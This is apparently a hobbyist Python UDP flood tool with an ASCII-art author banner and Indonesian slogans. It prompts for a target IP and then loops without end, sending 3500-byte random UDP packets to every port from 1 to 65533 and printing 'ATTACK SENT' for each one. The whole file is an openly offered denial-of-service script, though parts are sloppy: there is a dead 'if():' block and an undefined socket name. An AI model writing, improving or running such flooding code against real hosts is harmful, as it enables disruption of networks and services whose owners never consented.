# -*- coding: utf-8 -*-
import os
import socket
import random
import time


# Colors
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    UNDERLINE = '\033[4m'
    PURPLE = '\033[97m'
    BOLD    = "\033[1m"
    BLACK   = "\033[30m"
    RED     = "\033[31m"
    GREEN   = "\033[32m"
    YELLOW  = "\033[33m"
    BLUE    = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN    = "\033[36m"
    WHITE   = "\033[37m"
    os.system("clear")

########################
white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(3500)
####################

os.system("clear")
print("""
\033[33m                                                   ╔═ ╗           
\033[33m                                                   ║\033[32m█\033[33m ║  
\033[33m                                                   ║\033[32m█\033[33m ║  
\033[33m                                                   ║\033[32m█\033[33m ║        
\033[33m                   ╔═ ╗     ╔═ ╗      ╔═ ╗     ╔═ ╗║\033[32m█\033[33m ║     
\033[33m                   ║\033[32m█\033[33m ║     ║\033[32m█\033[33m ║      ║\033[32m█\033[33m ║     ║\033[32m█\033[33m ║║\033[32m█\033[33m ║    
\033[33m     ╔═ ╗          ║\033[32m█████████ █████████ █████████\033[33m ║║\033[32m█\033[33m ║
\033[33m     ║\033[32m█\033[33m ║          ║\033[32m████████\033[33m ║\033[32m ███████\033[33m ║\033[32m ███████\033[33m ║ ║\033[32m█\033[33m ║
\033[33m     ║\033[32m█\033[33m ║          ║\033[32m█\033[33m ╔═════╝  ╚══════╝╚╔═ ╗╔═ ╗╝  ║\033[32m█\033[33m ║
\033[33m     ║\033[32m█\033[33m ║          ║\033[32m█\033[33m ║                 ║\033[32m█\033[33m ║║\033[32m█\033[33m ║   ╚═ ╝
\033[33m      ║\033[32m███████████\033[33m ║                    ╚═ ╝╚═ ╝   
\033[33m       ║\033[32m██████████\033[33m ║                 
\033[33m        ╚═════════╝                  
\033[94m     ╔════════════════════════════════════════════════╗                   
\033[94m     ║\033[32m          Author By: AhmadSan/Kunfay99       ║
\033[94m     ╚════════════════════════════════════════════════╝
""")
ip = input("[+] Target's IP : ")
time.sleep(5),
print("\033[94m            --⟩⟩ : MENGENANG \033[0m "),
time.sleep(5),
print("\033[96m            --⟩⟩ : SEORQNG PEJUANG ISLAM \033[0m "),
time.sleep(5),
print("\033[92m            --⟩⟩ : YANG TANGGUH \033[0m "),
time.sleep(5),
print("\033[33m            --⟩⟩ : KETERBATASAN FISIK \033[0m "),
time.sleep(5),
print("\033[35m            --⟩⟩ : BUKAN ALASAN \033[0m "),
time.sleep(5),
print("\033[97m            --⟩⟩ : UNTUK BANGKIT \033[0m "),
time.sleep(5),
print("\033[33m            --⟩⟩ : MELAWAN PENINDASAN\033[0m")
time.sleep(5)
while True:
    sent = 0
    for port in range(1, 65534):
        white.sendto(bytes, (ip, port))
        sent = sent + 1
        time.sleep(1)
        print("\033[94m[AYAS] \033[97m%s  \033[31m[ATTACK SENT]  \033[92m%s  \033[36mPort \033[33m%s " % (sent, ip, port))
    if():
        s.close
        print("\033[92mSerangan wes Rampung\033[0m")
